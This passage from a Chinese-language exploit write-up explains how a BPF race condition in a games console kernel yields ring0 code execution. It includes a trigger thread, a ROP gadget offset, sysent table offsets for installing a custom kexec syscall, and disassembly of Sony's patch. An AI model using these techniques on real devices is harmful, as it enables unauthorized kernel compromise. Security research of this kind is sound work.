}  
}**
* * *
**触发代码执行**
* * *
到目前为止，我们已经能够破坏过滤程序并植入我们的无效指令了，接下来，我们需要让过滤程序运行起来，从而通过被覆盖的返回地址来触发代码执行了。由于我们希望该过滤程序提供“写入”功能，因此，bpfwrite()自然是完成该操作的理想之选。这意味着，我们还需要运行第三个线程，让它不断对第一个bpf设备执行write()函数。当该过滤程序遭到破坏后，接下来的write()调用将针对无效过滤程序，从而导致堆栈内存被破坏，并跳转到我们指定的任意地址，这样，我们就可以在ring0中执行代码了。
    void threadThree() // Tries to trigger code execution
    {
        void *scratch = (void *)malloc(0x200);
        for(;;)
        {
            uint64_t n = write(fd1, scratch, 0x200);
            if(n == 0x200))
            {
                break;
            }
        }
    }
**安装“kexec()”系统调用**
* * *
我们的kROP链的最终目标，是安装一个自定义的系统调用，以便可以在内核模式下执行代码。为了与4.05版本的代码保持一致，我们将再次使用系统调用＃11。该系统调用的签名如下所示：
    sys_kexec(void *code, void *uap);
安装系统调用的过程并不复杂，我们只需要在sysent表中添加一个表项即可。sysent表中的表项具有以下结构：
    struct sysent {                 /* system call table */
        int sy_narg;            /* number of arguments */
        sy_call_t *sy_call;         /* implementing function */
        au_event_t sy_auevent;      /* audit event associated with syscall */
        systrace_args_func_t sy_systrace_args_func;
                            /* optional argument conversion function. */
        u_int32_t sy_entry;         /* DTrace entry ID for systrace. */
        u_int32_t sy_return;        /* DTrace return ID for systrace. */
        u_int32_t sy_flags;         /* General flags for system calls. */
        u_int32_t sy_thrcnt;
    };
虽然上面的成员变量很多，但是我们只需关注sy_narg和sy_call。在这里，需要将sy_narg设为2（一个用于执行地址，另一个用于传递参数）。另外，由于要执行的代码的地址将通过RDI寄存器进行传递（请记住，虽然第一个参数通常借助RDI寄存器进行传递，但是在系统调用中，RDI寄存器将被线程描述符td占用），所以，我们需要将sy_call成员设置为将jmp传递到RSI寄存器的gadget。其实，jmp
qword ptr [rsi]就是一个满足上述要求的gadget，同时，该gadget可以从内核中找到，偏移量为0x13a39f。
    LOAD:FFFFFFFF8233A39F       FF 26          jmp qword ptr [rsi]
在4.55版本内核的转储中，我们可以看到syscall
11的sysent表项的偏移量为0xC2B8A0。正如你所看到的，这里的实现函数是nosys，所以它是一个理想的覆盖对象。
    _61000010:FFFFFFFF8322B8A0                 dq 0                    ; Syscall #11
    _61000010:FFFFFFFF8322B8A8                 dq offset nosys
    _61000010:FFFFFFFF8322B8B0                 dq 0
    _61000010:FFFFFFFF8322B8B8                 dq 0
    _61000010:FFFFFFFF8322B8C0                 dq 0
    _61000010:FFFFFFFF8322B8C8                 dq 400000000h
通过将2写入到0xC2B8A0处，将[kernel base + 0x13a39f]
写入到0xC2B8A8处，并将100000000写入到0xC2BBC8处（我们希望将标志从SY_THR_ABSENT改为SY_THR_STATIC），我们就可以成功插入一个自定义系统调用，之后通过该系统调用，我们就可以在内核模式下执行指定的任意代码了！
**索尼的“补丁”**
* * *
实际上，索尼并没有解决这个安全问题，不过，他们也确实知道BPF会导致一些不可思议的问题。通过简单的堆栈跟踪，他们发现bpfwrite()的返回地址遭到了破坏。不过，索尼似乎无法弄清楚到底是咋回事，所以采取了一种简单粗暴的做法：把bpfwrite()完全从内核中剥离出来——#_SonyWay。幸运的是，经过几小时的搜索，似乎没有找到可以利用这个过滤程序破坏漏洞的其他原语，所以，这个问题就这样归于沉寂了。
打补丁前的BPF cdevsw：
    bpf_devsw       dd 17122009h            ; d_version
                                            ; DATA XREF: sub_FFFFFFFFA181F140+1B↑o
                    dd 80000000h            ; d_flags
                    dq 0FFFFFFFFA1C92250h   ; d_name
                    dq 0FFFFFFFFA181F1B0h   ; d_open
                    dq 0                    ; d_fdopen
                    dq 0FFFFFFFFA16FD1C0h   ; d_close
                    dq 0FFFFFFFFA181F290h   ; d_read
                    dq 0FFFFFFFFA181F5D0h   ; d_write
                    dq 0FFFFFFFFA181FA40h   ; d_ioctl
                    dq 0FFFFFFFFA1820B30h   ; d_poll
                    dq 0FFFFFFFFA16FF050h   ; d_mmap
                    dq 0FFFFFFFFA16FF970h   ; d_strategy
                    dq 0FFFFFFFFA16FF050h   ; d_dump
                    dq 0FFFFFFFFA1820C90h   ; d_kqfilter
                    dq 0                    ; d_purge
                    dq 0FFFFFFFFA16FF050h   ; d_mmap_single
                    dd -5E900FB0h, -1, 0    ; d_spare0
                    dd 3 dup(0)             ; d_spare1
                    dq 0                    ; d_devs
                    dd 0                    ; d_spare2
                    dq 0                    ; gianttrick
                    dq 4EDE80000000000h     ; postfree_list
打过补丁后的BPF cdevsw：
    bpf_devsw       dd 17122009h            ; d_version
                                            ; DATA XREF: sub_FFFFFFFF9725DB40+1B↑o
                    dd 80000000h            ; d_flags
                    dq 0FFFFFFFF979538ACh   ; d_name
                    dq 0FFFFFFFF9725DBB0h   ; d_open
                    dq 0                    ; d_fdopen
                    dq 0FFFFFFFF9738D230h   ; d_close
                    dq 0FFFFFFFF9725DC90h   ; d_read
                    dq 0h                   ; d_write
                    dq 0FFFFFFFF9725E050h   ; d_ioctl
                    dq 0FFFFFFFF9725F0B0h   ; d_poll
                    dq 0FFFFFFFF9738F050h   ; d_mmap
                    dq 0FFFFFFFF9738F920h   ; d_strategy
                    dq 0FFFFFFFF9738F050h   ; d_dump
                    dq 0FFFFFFFF9725F210h   ; d_kqfilter
                    dq 0                    ; d_purge
                    dq 0FFFFFFFF9738F050h   ; d_mmap_single
                    dd 9738F050h, 0FFFFFFFFh, 0; d_spare0
                    dd 3 dup(0)             ; d_spare1
                    dq 0                    ; d_devs
                    dd 0                    ; dev_spare2
                    dq 0                    ; gianttrick
                    dq 51EDE0000000000h     ; postfree_list
请注意，d_write的数据已经不是有效的函数指针了。
**小结**
* * *
这是一个非常酷的漏洞。不过，由于非特权用户无法利用该漏洞，所以，该漏洞在大多数其他系统上没有太大的利用价值，但当需要从root权限提升至ring0代码执行权限的时候，这仍不失为一种有效方法。另外，我认为这篇文章也很值得一读，因为这里介绍的攻击策略是非常独特的（使用竞争条件触发堆栈溢出漏洞）。同时，本文也介绍了针对该漏洞的利用方法：覆盖堆栈上的返回指针的策略，这是所有处于学习阶段的安全研究人员都应该熟练掌握的一种简单利用方法。需要强调的是，这种攻击策略是非常古老的，实际上，这可能是最古老的一种攻击策略——但是，稍加改动，该策略仍然可以用于现代的漏洞利用代码中。
**致谢**
* * *
qwertyoruiopz
**参考资料**
* * *
Watson FreeBSD Kernel Cross Reference
Microsoft Support : Description of race conditions and deadlocks